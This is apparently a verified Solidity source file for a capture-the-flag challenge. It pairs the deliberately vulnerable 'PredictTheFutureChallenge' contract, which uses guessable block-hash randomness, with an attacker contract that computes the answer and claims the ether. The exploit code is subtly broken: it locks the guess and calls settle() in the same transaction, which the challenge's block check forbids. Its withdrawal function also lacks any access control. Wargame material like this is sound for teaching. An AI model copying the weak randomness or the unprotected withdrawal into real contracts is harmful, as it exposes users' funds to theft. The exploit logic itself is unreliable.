/**
 *Submitted for verification at Etherscan.io on 2022-02-20
*/

pragma solidity ^0.4.20;

contract Check {

    address public task;

    function setAddress(address _task) public{
        task = _task;
    } 

    function fanswer() public payable{
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        PredictTheFutureChallenge(task).lockInGuess.value(1 ether)(answer);
        PredictTheFutureChallenge(task).settle();
    }

    function deposit() public payable{
        require(msg.value == 1 ether); 
    }

    function withdrow() public payable{
        msg.sender.transfer(1 ether);
    }

    function() payable{

    }
}


contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}